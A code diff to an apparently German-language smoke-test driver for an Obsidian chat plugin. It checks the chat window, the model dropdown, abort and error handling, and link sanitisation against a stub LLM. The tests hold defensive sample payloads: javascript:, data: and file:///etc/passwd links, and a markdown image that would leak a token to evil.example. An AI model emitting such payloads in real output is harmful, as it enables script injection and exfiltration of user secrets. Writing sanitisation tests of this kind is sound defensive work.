@@ -84,6 +84,7 @@ const PUNKTE = [
   'ein/tab-leiste-ohne-neuaufbau',
   'setup/hinweis-erscheint',
   'setup/hinweis-nennt-ort-und-beispiel',
+  'setup/wechselt-nach-eintrag-in-den-chat',
   'layout/eingabezeile-sichtbar',
   'layout/log-scrollt-intern',
   'kontext/ausklapper-vorhanden',
@@ -101,6 +102,13 @@ const PUNKTE = [
   'markdown/fertige-antwort-gerendert',
   'markdown/eigene-frage-bleibt-rohtext',
   'markdown/stream-abgeschlossener-absatz-gerendert',
+  'chat/merk-dir-geht-nicht-ans-modell',
+  'chat/escape-bricht-ab',
+  'chat/fehlerzeile-bei-http-fehler',
+  'chat/linkschutz-skript-schemata',
+  'modellzeile/dropdown-zeigt-die-modelle-des-endpunkts',
+  'modellzeile/wechsel-wirkt-auf-die-naechste-anfrage',
+  'modellzeile/gesperrt-waehrend-des-laufs',
   'kontext/zeile-folgt-der-notiz',
   'manager/einstellungen-zeigen-den-manager-abschnitt',
   'manager/lauf-nutzt-den-manager-endpunkt',
@@ -169,6 +177,8 @@ async function setSetting(cdp: Cdp, key: string, value: unknown): Promise<void> 
     // Listen- und Modelländerung selbst, der Treiber setzt die Werte am Tab vorbei.
     p.llm?.invalidate();
     await p.persist();
+    // Der Speicherpfad der Verbindung zieht das Chat-Fenster nach (Einrichtungs-Hinweis ↔ Chat, Modellzeile); der Treiber setzt am Tab vorbei.
+    p.syncChat?.({ models: true });
     await new Promise((r) => setTimeout(r, 250));
     return true;
   `);
@@ -189,6 +199,70 @@ async function rebuildSidebar(cdp: Cdp): Promise<void> {
 
 /** Die Kuro-Ansicht im DOM. Als Ausdruck, weil jeder Prüfpunkt von ihr ausgeht. */
 const VIEW_EL = `document.querySelector(".workspace-leaf-content[data-type='${VIEW_TYPE}']")`;
+/** Das Plugin im Renderer. */
+const PLUGIN_EXPR = `app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]`;
+
+/* --------------------------- Das Chat-Fenster des Kits bedienen wie ein Nutzer */
+/* Selektoren des Kit-Fensters (obsidian-kit `chat-window`): `.okit-chat-input|send|log|turn|new|header|empty`. Der Treiber tippt ins Feld und klickt
+   „Senden“ gegen den Stub-Endpunkt (CORE-TEST-15: das echte Fenster wird gemessen, nicht ein Test-API am Plugin). */
+
+/** Ausdruck: Verlauf leeren wie ein Nutzer („Neu“ des Fensters bricht einen laufenden Lauf ab) und den Verlauf im Plugin leer setzen. */
+const CHAT_LEEREN = `(() => { const b = ${VIEW_EL}?.querySelector(".okit-chat-new"); if (b) b.click(); ${PLUGIN_EXPR}.chatHistory = { entries: [], nextId: 1 }; })();`;
+
+/** Ausdruck: die letzte Antwort des Verlaufs im Plugin hat ihren Lauf beendet (und es gibt mindestens eine). */
+const CHAT_ANTWORT_ENDE = `(() => { const a = ${PLUGIN_EXPR}.chatHistory.entries.filter((x) => x.kind === "assistant"); const l = a[a.length - 1]; return l !== undefined && l.state !== "streaming"; })()`;
+
+/** „Neu“ klicken. `false`, wenn kein Fenster im Chat-Tab steht. */
+async function chatNeu(cdp: Cdp): Promise<boolean> {
+  return cdp.evaluate<boolean>(`
+    const b = ${VIEW_EL}?.querySelector(".okit-chat-new");
+    if (!b) return false;
+    b.click();
+    ${PLUGIN_EXPR}.chatHistory = { entries: [], nextId: 1 };
+    await new Promise((r) => setTimeout(r, 250));
+    return true;
+  `);
+}
+
+/** Eine Frage wie ein Nutzer: ins Eingabefeld tippen, „Senden“ klicken. Wartet nicht auf die Antwort. `false`, wenn Feld oder Knopf fehlen. */
+async function chatSenden(cdp: Cdp, frage: string): Promise<boolean> {
+  return cdp.evaluate<boolean>(`
+    const v = ${VIEW_EL};
+    const input = v?.querySelector(".okit-chat-input");
+    const send = v?.querySelector(".okit-chat-send");
+    if (!input || !send) return false;
+    input.value = ${JSON.stringify(frage)};
+    input.dispatchEvent(new Event("input", { bubbles: true }));
+    send.click();
+    return true;
+  `);
+}
+
+/** Wartet (Knoten-Seite, `pollUntil`), bis die letzte Antwort ihren Lauf beendet hat. */
+async function chatWarteAufEnde(cdp: Cdp, ms = 20_000): Promise<boolean> {
+  return (await pollUntil<boolean>(cdp, `return ${CHAT_ANTWORT_ENDE} ? true : null;`, ms, 100).catch(() => false)) === true;
+}
+
+/** Senden und auf das Ende der Antwort warten. */
+async function chatFrage(cdp: Cdp, frage: string): Promise<boolean> {
+  if (!(await chatSenden(cdp, frage))) return false;
+  return chatWarteAufEnde(cdp);
+}
+
+/** Einen Verlauf als Daten setzen (chat-history ist reines JSON) und die Ansicht neu bauen: das Fenster zeichnet ihn über seinen Produktionsweg
+ *  (`initial`), danach steht der Chat-Tab vorn. Einträge: `{ nutzer: "…" }` oder `{ antwort: "…" }`. */
+async function setzeVerlauf(cdp: Cdp, zeilen: Array<{ nutzer: string } | { antwort: string }>): Promise<void> {
+  const entries = zeilen.map((z, i) => 'nutzer' in z
+    ? { kind: 'user', id: i + 1, text: z.nutzer }
+    : { kind: 'assistant', id: i + 1, text: z.antwort, reasoning: '', state: 'done' });
+  await cdp.evaluate(`
+    ${PLUGIN_EXPR}.chatHistory = { entries: ${JSON.stringify(entries)}, nextId: ${entries.length + 1} };
+    ${PLUGIN_EXPR}.syncChatUI();
+    await new Promise((r) => setTimeout(r, 700));
+    return true;
+  `);
+  await oeffneChatTab(cdp);
+}
 
 /* ---------------------------------------------------- 1 · Aus-Zustand */
 
@@ -307,12 +381,13 @@ async function sektionSetupHinweis(cdp: Cdp): Promise<void> {
 
   const hinweis = await pollUntil<string>(
     cdp,
-    `const el = ${VIEW_EL}?.querySelector(".kuro-chat-body .kuro-empty");
-     return el ? el.textContent.trim() : null;`,
+    // Sichtbar heißt gemessen (Höhe > 0), nicht „Klasse fehlt“: das Fake-DOM der Tests sieht keine Kaskade, der Renderer schon.
+    `const el = ${VIEW_EL}?.querySelector(".kuro-chat-body .okit-chat-empty");
+     return el && el.offsetHeight > 0 ? el.textContent.trim() : null;`,
     8000,
   );
   if (!hinweis) {
-    record('setup/hinweis-erscheint', false, 'kein .kuro-empty im Chat-Tab bei leerer Endpunkt-Liste');
+    record('setup/hinweis-erscheint', false, 'kein sichtbarer .okit-chat-empty im Chat-Tab bei leerer Endpunkt-Liste');
     return;
   }
   record('setup/hinweis-erscheint', true, `${hinweis.slice(0, 60)}…`);
@@ -323,6 +398,25 @@ async function sektionSetupHinweis(cdp: Cdp): Promise<void> {
     'setup/hinweis-nennt-ort-und-beispiel',
     hinweis.includes('localhost:1234') && /Endpunkte|Endpoints/.test(hinweis),
     'Hinweis nennt die Sektion und eine Beispieladresse',
+  );
+
+  // Trägt der Nutzer einen Endpunkt ein, muss das Fenster ohne Neuaufbau der Ansicht in den Chat wechseln (`syncChat` nach der Änderung, wie der
+  // Speicherpfad der Verbindung es tut); sonst bliebe der Hinweis stehen, bis die Seitenleiste geschlossen und neu geöffnet wird.
+  const wechsel = await cdp.evaluate<{ leer: boolean | null; eingabe: boolean; zeilen: number }>(`
+    const p = ${PLUGIN_EXPR};
+    p.data.settings.chatEndpoints = [{ url: ${JSON.stringify(SMOKE_ENDPOINT_URL)} }];
+    p.llm.invalidate();
+    p.syncChat({ models: true });
+    await new Promise((r) => setTimeout(r, 700));
+    const v = ${VIEW_EL};
+    const leer = v?.querySelector(".okit-chat-empty");
+    const feld = v?.querySelector(".okit-chat-input");
+    return { leer: leer ? leer.offsetHeight > 0 : null, eingabe: Boolean(feld) && feld.offsetHeight > 0, zeilen: v ? v.querySelectorAll(".okit-model-bar").length : -1 };
+  `);
+  record(
+    'setup/wechselt-nach-eintrag-in-den-chat',
+    wechsel.leer === false && wechsel.eingabe && wechsel.zeilen === 1,
+    `nach dem Eintrag: Hinweis sichtbar ${String(wechsel.leer)}, Eingabefeld sichtbar ${String(wechsel.eingabe)}, ${wechsel.zeilen} Modellzeile(n) — ohne die Ansicht neu zu bauen`,
   );
 }
 
@@ -348,21 +442,9 @@ async function sektionLayout(cdp: Cdp): Promise<void> {
   await rebuildSidebar(cdp);
   await oeffneChatTab(cdp);
 
-  const gefuellt = await cdp.evaluate<boolean>(`
-    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
-    p.chatSession.reset();
-    for (let i = 0; i < 30; i++) {
-      p.chatSession.append({
-        role: i % 2 === 0 ? "user" : "assistant",
-        text: "Zeile " + i + " — " + "Lorem ipsum dolor sit amet, consetetur sadipscing elitr. ".repeat(4),
-      });
-    }
-    for (const leaf of app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})) {
-      leaf.view.renderChat?.();
-    }
-    await new Promise((r) => setTimeout(r, 600));
-    return true;
-  `);
+  const fuelltext = 'Lorem ipsum dolor sit amet, consetetur sadipscing elitr. '.repeat(4);
+  await setzeVerlauf(cdp, Array.from({ length: 30 }, (_, i) => (i % 2 === 0 ? { nutzer: `Zeile ${i} — ${fuelltext}` } : { antwort: `Zeile ${i} — ${fuelltext}` })));
+  const gefuellt = await cdp.evaluate<boolean>(`return ${VIEW_EL}?.querySelectorAll(".okit-chat-turn").length >= 30;`);
   if (!gefuellt) {
     for (const n of ['layout/eingabezeile-sichtbar', 'layout/log-scrollt-intern'] as const) unmeasured(n, 'Chat-Verlauf ließ sich nicht befüllen');
     return;
@@ -385,9 +467,10 @@ async function sektionLayout(cdp: Cdp): Promise<void> {
     if (!view) return { ok: false, grund: "keine Kuro-Ansicht" };
     const body = view.querySelector(".kuro-chat-body");
     if (!body) return { ok: false, grund: "kein .kuro-chat-body" };
-    const log = body.querySelector(".kuro-chat-log");
-    const row = body.querySelector(".kuro-chat-inputrow");
-    if (!log || !row) return { ok: false, grund: "Log oder Eingabezeile fehlt" };
+    const log = body.querySelector(".okit-chat-log");
+    // Das Fenster endet mit der Zustandszeile unter Eingabe und Knöpfen: sie ist das unterste Element, das erreichbar bleiben muss.
+    const row = body.querySelector(".okit-chat-statusbar");
+    if (!log || !row) return { ok: false, grund: "Verlauf oder Zustandszeile des Fensters fehlt" };
     return {
       ok: true,
       inputBottom: row.getBoundingClientRect().bottom,
@@ -405,7 +488,7 @@ async function sektionLayout(cdp: Cdp): Promise<void> {
   record(
     'layout/eingabezeile-sichtbar',
     (mass.inputBottom ?? 0) <= (mass.containerBottom ?? 0) + toleranz,
-    `Eingabezeile endet bei ${Math.round(mass.inputBottom ?? 0)}px, Seitenleiste bei ${Math.round(mass.containerBottom ?? 0)}px`,
+    `Unterkante des Fensters (Zustandszeile unter der Eingabe) bei ${Math.round(mass.inputBottom ?? 0)}px, Seitenleiste bei ${Math.round(mass.containerBottom ?? 0)}px`,
   );
   record(
     'layout/log-scrollt-intern',
@@ -534,23 +617,17 @@ async function sektionMarkdown(cdp: Cdp): Promise<void> {
   await oeffneChatTab(cdp);
 
   // (a) Fertige Antwort: Fettung und Liste müssen als Elemente da sein, nicht als Sternchen.
-  await cdp.evaluate(`
-    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
-    p.chatSession.reset();
-    p.chatSession.append({ role: "user", text: "eine *Frage*" });
-    p.chatSession.append({ role: "assistant", text: "Das ist **fett**.\\n\\n- eins\\n- zwei" });
-    p.syncChat();
-    return true;
-  `);
+  await setzeVerlauf(cdp, [{ nutzer: 'eine *Frage*' }, { antwort: 'Das ist **fett**.\n\n- eins\n- zwei' }]);
   const fertig = await pollUntil<{ strong: number; li: number; frageRoh: boolean; ws: string } | null>(
     cdp,
     `const v = ${VIEW_EL};
-     const md = v?.querySelector(".kuro-chat-assistant .kuro-chat-md");
+     const md = v?.querySelector(".okit-chat-turn.is-assistant .okit-stream-body");
      if (!md || md.querySelectorAll("li").length < 2) return null;
-     const frage = v.querySelector(".kuro-chat-user .kuro-chat-text");
+     const frage = v.querySelector(".okit-chat-turn.is-user .okit-chat-text");
+     const block = md.querySelector(".okit-stream-block");
      return { strong: md.querySelectorAll("strong").length, li: md.querySelectorAll("li").length,
               frageRoh: frage?.textContent === "eine *Frage*" && !frage.querySelector("em"),
-              ws: getComputedStyle(md).whiteSpace };`,
+              ws: block ? getComputedStyle(block).whiteSpace : "?" };`,
     6000,
   );
   record(
@@ -564,31 +641,187 @@ async function sektionMarkdown(cdp: Cdp): Promise<void> {
     fertig?.frageRoh === true ? 'Sternchen der Frage unverändert' : 'Frage wurde gerendert oder fehlt',
   );
 
-  // (b) Stream: ein abgeschlossener Absatz wird gerendert, der laufende bleibt Rohtext.
-  const stream = await cdp.evaluate<{ block: number; strong: number; tail: string } | null>(`
-    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
-    p.chatSession.reset();
-    p.chatSession.streaming = "";
-    p.syncChat();
-    await new Promise((r) => setTimeout(r, 300));
-    const leaf = app.workspace.getLeavesOfType(${JSON.stringify(VIEW_TYPE)})[0];
-    leaf.view.appendChatToken("Erster **Absatz**\\n\\nZwei");
-    await new Promise((r) => setTimeout(r, 600));
-    const v = ${VIEW_EL};
-    const c = v?.querySelector(".kuro-chat-stream-content");
-    const out = c ? { block: c.querySelectorAll(".okit-stream-block").length,
-      strong: c.querySelectorAll(".okit-stream-block strong").length,
-      tail: c.querySelector(".okit-stream-tail")?.textContent ?? "" } : null;
-    p.chatSession.streaming = null;
-    p.chatSession.reset();
-    p.syncChat();
-    return out;
-  `);
-  record(
-    'markdown/stream-abgeschlossener-absatz-gerendert',
-    stream !== null && stream.block === 1 && stream.strong === 1 && stream.tail === 'Zwei',
-    stream === null ? 'keine laufende Zeile im Chat' : `${stream.block} Block, ${stream.strong}× <strong>, Tail „${stream.tail}“`,
-  );
+  // (b) Stream: ein abgeschlossener Absatz wird gerendert, der laufende bleibt Rohtext. Der Stub liefert zwei Stücke und hält den Strom danach offen,
+  // damit gemessen wird, solange die Antwort läuft (am Ende setzt das Ergebnis den Text neu).
+  const stub = await startLlmStub({ models: [MANAGER_DEFAULT_MODEL], takt: 150, standard: { stuecke: ['Erster **Absatz**\n\n', 'Zwei'], nachlaufMs: 8000 } });
+  try {
+    await setSetting(cdp, 'chatEndpoints', [{ url: stub.url, model: MANAGER_DEFAULT_MODEL }]);
+    await cdp.evaluate(`${PLUGIN_EXPR}.llm.invalidate(); return true;`);
+    await rebuildSidebar(cdp);
+    await oeffneChatTab(cdp);
+    await chatNeu(cdp);
+    const gesendet = await chatSenden(cdp, 'Frage');
+    const stream = gesendet
+      ? await pollUntil<{ block: number; strong: number; tail: string } | null>(
+        cdp,
+        `const body = ${VIEW_EL}?.querySelector(".okit-chat-turn.is-assistant .okit-stream-body");
+         if (!body) return null;
+         const tail = (body.querySelector(".okit-stream-tail")?.textContent ?? "").trim();
+         const blocks = body.querySelectorAll(".okit-stream-block");
+         if (blocks.length < 1 || tail !== "Zwei") return null;
+         return { block: blocks.length, strong: body.querySelectorAll(".okit-stream-block strong").length, tail };`,
+        8000,
+        100,
+      ).catch(() => null)
+      : null;
+    record(
+      'markdown/stream-abgeschlossener-absatz-gerendert',
+      stream !== null && stream.block === 1 && stream.strong === 1 && stream.tail === 'Zwei',
+      stream === null ? 'keine laufende Antwort im Chat' : `${stream.block} Block, ${stream.strong}× <strong>, Tail „${stream.tail}“`,
+    );
+    await chatNeu(cdp);
+  } finally {
+    await setSetting(cdp, 'chatEndpoints', [{ url: SMOKE_ENDPOINT_URL }]);
+    await stub.stop().catch(() => undefined);
+  }
+}
+
+/* ------------------------- 9b · Chat-Fenster und Modellzeile (Kit-Bausteine 12 und 15) */
+
+/** Das Fenster und die Modellzeile des Kits, bedient wie von einem Nutzer, gegen einen Stub mit zwei Modellen (ohne Manager gibt es keinen Eintrag
+ *  „Anderer Endpunkt …“: Automatisch + zwei Modelle = drei Einträge). „merk dir“ ist ein Befehl im Plugin, kein Wurf ans Modell; Escape bricht ab;
+ *  ein HTTP-Fehler steht als Fehlerzeile mit der Begründung des Servers; die Modellzeile sperrt sich im Lauf und ihr Wechsel erreicht die nächste
+ *  Anfrage; der Linkschutz ist nur MESSUNG: kappt die Kette die Skript-Schemata nicht, ist der Punkt rot und der Befund geht an den Master. */
+const FENSTER_NAMEN = [
+  'chat/merk-dir-geht-nicht-ans-modell',
+  'chat/escape-bricht-ab',
+  'chat/fehlerzeile-bei-http-fehler',
+  'chat/linkschutz-skript-schemata',
+  'modellzeile/dropdown-zeigt-die-modelle-des-endpunkts',
+  'modellzeile/wechsel-wirkt-auf-die-naechste-anfrage',
+  'modellzeile/gesperrt-waehrend-des-laufs',
+] as const;
+
+const LINKS_ANTWORT = '[a-js](javascript:alert(1)) [b-data](data:text/html,x) [c-obs](obsidian://open?vault=x) [d-file](file:///etc/passwd) [e-app](app://obsidian.md/x) [f-ok](https://example.org/ok)';
+
+async function sektionFenster(cdp: Cdp): Promise<void> {
+  let stub: Awaited<ReturnType<typeof startLlmStub>> | null = null;
+  const notizenVorher = await cdp.evaluate<string[]>(`return JSON.parse(JSON.stringify(${PLUGIN_EXPR}.data.kuroNotes));`);
+  try {
+    await removeFakeManager(cdp);
+    const normal = { stuecke: ['Antwort ', 'vom Stub'] };
+    stub = await startLlmStub({ models: ['modell-a', 'modell-b'], standard: normal });
+    const s = stub;
+    await setSetting(cdp, 'chatEndpoints', [{ url: s.url, model: 'modell-a' }]);
+    await setSetting(cdp, 'chatChoice', {});
+    await cdp.evaluate(`${PLUGIN_EXPR}.llm.invalidate(); return true;`);
+    await rebuildSidebar(cdp);
+    await oeffneChatTab(cdp);
+    await chatNeu(cdp);
+
+    // Modellzeile: Dropdown mit Automatisch und beiden Modellen, das gewählte Modell steht da.
+    const zeile = await pollUntil<{ optionen: string[]; wert: string; label: string } | null>(
+      cdp,
+      `const sel = ${VIEW_EL}?.querySelector(".okit-model-bar-select");
+       if (!sel || sel.options.length < 3) return null;
+       return { optionen: [...sel.options].map((o) => o.textContent.trim()), wert: sel.value,
+                label: ${VIEW_EL}.querySelector(".okit-model-bar-label")?.textContent ?? "" };`,
+      8000,
+      200,
+    ).catch(() => null);
+    record(
+      'modellzeile/dropdown-zeigt-die-modelle-des-endpunkts',
+      zeile !== null && zeile.optionen.length === 3 && zeile.optionen.includes('modell-a') && zeile.optionen.includes('modell-b') && zeile.wert === 'modell-a' && zeile.label === 'Chat',
+      zeile === null ? 'keine Modellzeile mit mindestens drei Einträgen im Chat-Tab' : `Beschriftung „${zeile.label}“, Einträge ${zeile.optionen.join(' · ')}, gewählt ${zeile.wert}`,
+    );
+
+    // Wechsel wirkt: die Wahl landet in der Zeile des Endpunkts und in der nächsten Anfrage.
+    await cdp.evaluate(`
+      const sel = ${VIEW_EL}.querySelector(".okit-model-bar-select");
+      sel.value = "modell-b";
+      sel.dispatchEvent(new Event("change", { bubbles: true }));
+      return true;
+    `);
+    const gespeichert = await pollUntil<string>(cdp, `const m = ${PLUGIN_EXPR}.data.settings.chatEndpoints[0]?.model; return m === "modell-b" ? m : null;`, 5000, 100).catch(() => null);
+    await chatNeu(cdp);
+    const beantwortet = await chatFrage(cdp, 'Welches Modell?');
+    const gesendet = (s.letzte('chat')?.json as { model?: string } | null)?.model ?? null;
+    record(
+      'modellzeile/wechsel-wirkt-auf-die-naechste-anfrage',
+      gespeichert === 'modell-b' && beantwortet && gesendet === 'modell-b',
+      `gespeichert ${String(gespeichert)}, gesendet ${String(gesendet)}${beantwortet ? '' : ', Antwort kam nicht'}`,
+    );
+
+    // Gesperrt im Lauf, Escape bricht ab (derselbe langsame Strom).
+    s.konfiguriere({ takt: 400, standard: { stuecke: ['a ', 'b ', 'c ', 'd ', 'e ', 'f '], nachlaufMs: 3000 } });
+    await chatNeu(cdp);
+    await chatSenden(cdp, 'Langsam bitte');
+    const gesperrt = await pollUntil<boolean>(cdp, `const sel = ${VIEW_EL}?.querySelector(".okit-model-bar-select"); return sel && sel.disabled ? true : null;`, 5000, 100).catch(() => false);
+    record(
+      'modellzeile/gesperrt-waehrend-des-laufs',
+      gesperrt === true,
+      gesperrt === true ? 'Dropdown während des Laufs gesperrt' : 'Dropdown blieb während des Laufs bedienbar',
+    );
+    await cdp.evaluate(`
+      const input = ${VIEW_EL}.querySelector(".okit-chat-input");
+      input.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true, cancelable: true }));
+      return true;
+    `);
+    const abgebrochen = await pollUntil<boolean>(cdp, `const a = ${PLUGIN_EXPR}.chatHistory.entries.filter((x) => x.kind === "assistant"); return a.length > 0 && a[a.length - 1].state === "aborted" ? true : null;`, 5000, 100).catch(() => false);
+    const frei = await cdp.evaluate<boolean>(`const sel = ${VIEW_EL}.querySelector(".okit-model-bar-select"); return Boolean(sel) && !sel.disabled;`);
+    record(
+      'chat/escape-bricht-ab',
+      abgebrochen === true && frei,
+      `Antwort ${abgebrochen === true ? 'abgebrochen' : 'läuft weiter'}, Modellzeile danach ${frei ? 'frei' : 'noch gesperrt'}`,
+    );
+
+    // HTTP-Fehler: die Fehlerzeile nennt die Begründung des Servers (nur bei HTTP, Entscheidung im Kit).
+    s.konfiguriere({ takt: 0, standard: { status: 500, fehler: 'Modell abgestürzt: kein Speicher mehr' } });
+    await chatNeu(cdp);
+    await chatFrage(cdp, 'Kaputt bitte');
+    const fehler = await cdp.evaluate<{ da: boolean; sichtbar: boolean; text: string; status: string }>(`
+      const e = ${VIEW_EL}?.querySelector(".okit-chat-error");
+      const a = ${PLUGIN_EXPR}.chatHistory.entries.filter((x) => x.kind === "assistant");
+      return { da: Boolean(e), sichtbar: Boolean(e) && e.offsetHeight > 0, text: e ? e.textContent : "", status: a.length ? a[a.length - 1].state : "?" };
+    `);
+    record(
+      'chat/fehlerzeile-bei-http-fehler',
+      fehler.da && fehler.sichtbar && fehler.status === 'failed' && fehler.text.includes('kein Speicher'),
+      fehler.da ? `Zustand ${fehler.status}, Zeile „${fehler.text.slice(0, 90)}“` : 'keine Fehlerzeile im Fenster',
+    );
+
+    // „merk dir“: kein Wurf ans Modell, der Merkzettel wächst, der Entwurf ist leer.
+    s.konfiguriere({ standard: normal });
+    await chatNeu(cdp);
+    const anfragenVorher = s.zaehler().chat;
+    await chatSenden(cdp, 'merk dir: smoke-notiz-4711');
+    await cdp.evaluate(`await new Promise((r) => setTimeout(r, 600)); return true;`);
+    const merk = await cdp.evaluate<{ notiz: boolean; entwurf: string; runden: number }>(`
+      return { notiz: ${PLUGIN_EXPR}.data.kuroNotes.includes("smoke-notiz-4711"),
+               entwurf: ${VIEW_EL}.querySelector(".okit-chat-input").value,
+               runden: ${PLUGIN_EXPR}.chatHistory.entries.length };
+    `);
+    record(
+      'chat/merk-dir-geht-nicht-ans-modell',
+      s.zaehler().chat === anfragenVorher && merk.notiz && merk.entwurf === '' && merk.runden === 0,
+      `Anfragen am Stub ${s.zaehler().chat - anfragenVorher} neu, Merkzettel ${merk.notiz ? 'gewachsen' : 'unverändert'}, Entwurf „${merk.entwurf}“, ${merk.runden} Einträge im Verlauf`,
+    );
+
+    // Linkschutz (Messung): Links mit Skript-Schemata in einer Antwort.
+    s.konfiguriere({ standard: { text: LINKS_ANTWORT } });
+    await chatNeu(cdp);
+    await chatFrage(cdp, 'Links bitte');
+    const links = await cdp.evaluate<Array<{ t: string; h: string | null }>>(`
+      return [...${VIEW_EL}.querySelectorAll(".okit-chat-turn.is-assistant .okit-stream-block a")].map((a) => ({ t: a.textContent || "", h: a.getAttribute("href") }));
+    `);
+    const von = (t: string): { t: string; h: string | null } | undefined => links.find((l) => l.t === t);
+    const gekappt = ['a-js', 'b-data', 'c-obs', 'd-file', 'e-app'].map((t) => ({ t, link: von(t) }));
+    const alleDa = gekappt.every((x) => x.link !== undefined);
+    record(
+      'chat/linkschutz-skript-schemata',
+      alleDa && gekappt.every((x) => x.link?.h === null || x.link?.h === undefined) && von('f-ok')?.h === 'https://example.org/ok',
+      `Anker im Antworttext: ${links.map((l) => `${l.t} -> ${String(l.h)}`).join('; ') || '(keine)'} · alle fünf Anker da: ${String(alleDa)}`,
+    );
+  } catch (e) {
+    if (istAbgebrochen()) throw e;
+    for (const n of FENSTER_NAMEN) if (!aufgezeichnet(n)) unmeasured(n, `Messung abgebrochen: ${(e as Error).message}`);
+  } finally {
+    if (!istAbgebrochen()) {
+      await cdp.evaluate(`${PLUGIN_EXPR}.data.kuroNotes = ${JSON.stringify(notizenVorher)}; await ${PLUGIN_EXPR}.persist(); ${CHAT_LEEREN} return true;`).catch(() => undefined);
+      await setSetting(cdp, 'chatEndpoints', [{ url: SMOKE_ENDPOINT_URL }]).catch(() => undefined);
+    }
+    if (stub) await stub.stop().catch(() => undefined);
+  }
 }
 
 async function sektionKontextSync(cdp: Cdp): Promise<void> {
@@ -797,15 +1030,11 @@ async function sektionManager(cdp: Cdp): Promise<void> {
       text === null ? 'Einstellungen nicht lesbar' : zeigtManager ? '„Endpunkte kommen vom LLM Endpoint Manager“ sichtbar' : 'Abschnitt fehlt',
     );
 
-    await cdp.evaluate(`
-      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
-      p.chatSession.reset();
-      await p.askKuro("Hallo");
-      return true;
-    `);
+    await chatNeu(cdp);
+    await chatFrage(cdp, 'Hallo');
     const gerendert = await pollUntil<boolean>(
       cdp,
-      `return Boolean(${VIEW_EL}?.querySelector(".kuro-chat-assistant .kuro-chat-md strong"));`,
+      `return Boolean(${VIEW_EL}?.querySelector(".okit-chat-turn.is-assistant strong"));`,
       8000,
     ).catch(() => false);
     record(
@@ -827,13 +1056,9 @@ async function sektionManager(cdp: Cdp): Promise<void> {
     // Manager weg → lokale Liste wie zuvor.
     await removeFakeManager(cdp);
     await setSetting(cdp, 'chatEndpoints', [{ url: fake.url }]);
-    await cdp.evaluate(`
-      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
-      p.llm.invalidate();
-      p.chatSession.reset();
-      await p.askKuro("Nochmal");
-      return true;
-    `);
+    await cdp.evaluate(`${PLUGIN_EXPR}.llm.invalidate(); return true;`);
+    await chatNeu(cdp);
+    await chatFrage(cdp, 'Nochmal');
     record(
       'manager/ohne-manager-laeuft-die-lokale-liste',
       fake.calls() === 2,
@@ -871,11 +1096,8 @@ async function sektionVerbindung(cdp: Cdp): Promise<void> {
     );
 
     // V2 · Schwärzung und Wiederherstellung samt Bearer-Header (der Schlüssel kommt aus dem Schlüsselbund zurück).
-    await cdp.evaluate(`
-      ${P}.chatSession.reset();
-      await ${P}.askKuro(${JSON.stringify(`bitte wiederholen: ${TOKEN}`)});
-      return true;
-    `);
+    await chatNeu(cdp);
+    await chatFrage(cdp, `bitte wiederholen: ${TOKEN}`);
     const gesendet = JSON.stringify(fake.lastBody() ?? {});
     record(
       'verbindung/bearer-header-aus-dem-schluesselbund',
@@ -884,7 +1106,7 @@ async function sektionVerbindung(cdp: Cdp): Promise<void> {
     );
     const antwort = await pollUntil<string | null>(
       cdp,
-      `const md = ${VIEW_EL}?.querySelector(".kuro-chat-assistant .kuro-chat-md"); return md && md.textContent.includes("echo:") ? md.textContent : null;`,
+      `const md = ${VIEW_EL}?.querySelector(".okit-chat-turn.is-assistant .okit-stream-body"); return md && md.textContent.includes("echo:") ? md.textContent : null;`,
       8000,
     ).catch(() => null);
     record(
@@ -895,14 +1117,11 @@ async function sektionVerbindung(cdp: Cdp): Promise<void> {
 
     // V3 · Neutralisierung am echten Renderer: Bild-URL mit Platzhalter (kommt als Original zurück) und dataviewjs.
     // Die spitzen Klammern erlauben das Leerzeichen im Token — ohne sie wäre es gar kein Bild und der Punkt nicht trennscharf.
-    await cdp.evaluate(`
-      ${P}.chatSession.reset();
-      await ${P}.askKuro(${JSON.stringify(`![x](<https://evil.example/?d=${TOKEN}>)`)});
-      return true;
-    `);
+    await chatNeu(cdp);
+    await chatFrage(cdp, `![x](<https://evil.example/?d=${TOKEN}>)`);
     const bild = await pollUntil<{ img: number; text: string } | null>(
       cdp,
-      `const md = ${VIEW_EL}?.querySelector(".kuro-chat-assistant .kuro-chat-md"); return md && (md.textContent.includes("evil.example") || md.querySelector("img")) ? { img: md.querySelectorAll("img").length, text: md.textContent } : null;`,
+      `const md = ${VIEW_EL}?.querySelector(".okit-chat-turn.is-assistant .okit-stream-body"); return md && (md.textContent.includes("evil.example") || md.querySelector("img")) ? { img: md.querySelectorAll("img").length, text: md.textContent } : null;`,
       8000,
     ).catch(() => null);
     record(
@@ -910,12 +1129,10 @@ async function sektionVerbindung(cdp: Cdp): Promise<void> {
       bild !== null && bild.img === 0,
       bild === null ? 'Antwort nicht im Chat' : `${bild.img}× <img> in der gerenderten Antwort`,
     );
+    await setzeVerlauf(cdp, [{ nutzer: 'x' }, { antwort: 'vorher\n\n```dataviewjs\ndv.paragraph(1)\n```\n\nnachher' }]);
     const code = await cdp.evaluate<{ blocks: number; text: boolean }>(`
-      ${P}.chatSession.reset();
-      ${P}.chatSession.append({ role: "assistant", text: "vorher\\n\\n\`\`\`dataviewjs\\ndv.paragraph(1)\\n\`\`\`\\n\\nnachher" });
-      ${P}.syncChat();
-      await new Promise((r) => setTimeout(r, 800));
-      const md = ${VIEW_EL}?.querySelector(".kuro-chat-assistant .kuro-chat-md");
+      await new Promise((r) => setTimeout(r, 400));
+      const md = ${VIEW_EL}?.querySelector(".okit-chat-turn.is-assistant .okit-stream-body");
       return { blocks: md ? md.querySelectorAll(".block-language-dataviewjs, .block-language-dataview").length : -1,
                text: Boolean(md) && md.textContent.includes("dataviewjs") };
     `);
@@ -925,8 +1142,8 @@ async function sektionVerbindung(cdp: Cdp): Promise<void> {
       `${code.blocks} aktive Blöcke, Text „dataviewjs“ ${code.text ? 'sichtbar' : 'fehlt'}`,
     );
   } finally {
+    await cdp.evaluate(`${CHAT_LEEREN} return true;`);
     await setSetting(cdp, 'chatEndpoints', []);
-    await cdp.evaluate(`${P}.chatSession.reset(); ${P}.syncChat(); return true;`);
